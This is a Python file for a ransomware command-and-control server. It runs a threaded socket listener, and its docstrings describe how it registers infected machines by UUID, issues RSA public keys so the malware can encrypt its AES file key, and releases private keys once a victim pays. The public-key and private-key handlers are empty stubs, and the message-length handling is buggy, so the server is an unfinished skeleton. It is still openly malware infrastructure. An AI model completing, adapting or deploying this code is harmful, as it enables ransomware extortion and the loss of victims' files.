import socket
import threading

# server stuff
PORT = 5051
SERVER = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  #server ip address
SERVER.connect(('8.8.8.8', 80))
SERVER = SERVER.getsockname()[0]
ADDR = (SERVER, PORT)
HEADER = 64
FORMAT = 'utf-8'

#commands
COMMAND_PUBLIC_KEY = 'public-key'
COMMAND_PRIVATE_KEY = 'private-key'
COMMAND_DISCONNECT = 'disconnect'


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def handle_client(conn, addr):
    """
    This function communicates with the ransomware infected machine.
    FIRST the ransomware will send a UUID which uniquely identifies the correspondent infected machine
    IF this UUID is new, create a new record for it
    IF the ransomware asks for a public key THEN:
        1. The ransomware creates a connection with this server
        2. The C2 server generates an RSA key pair (and updates the registry)
        3. The public key is sent to the client machine via the socket
        4. The ransomware ought to encrypt its AES symmetric key with this public key
    IF the ransomware asks for the private key to free the victim THEN
        1. Looks up the registry records for the corresponding private key
        2. Send the private key
        3. The ransomware now ought to decrypt the victim's files 
    """
    connected = True
    print("[New conncetion]",addr)

    while connected:
        msg_len = conn.recv(HEADER).decode(FORMAT)
        if msg_len:
            msg_len = int(msg_len)
            msg = conn.recv(HEADER).decode(FORMAT)
            if msg == COMMAND_DISCONNECT:
                connected = False
            elif msg == COMMAND_PUBLIC_KEY:
                pass
            elif msg == COMMAND_PRIVATE_KEY:
                pass
            print("[Command]",addr, msg)
    conn.close()



def start():
    """
    This function is used to initialize the server loop and accept incoming connections.
    When the connection is accepted, a new thread spins off and communicates with the infected machine.
    See handle_client function next
    """
    server.listen()
    print("C2 listening on " + SERVER + ":" + str(PORT))
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()

    

print("C2 Starting..")
start()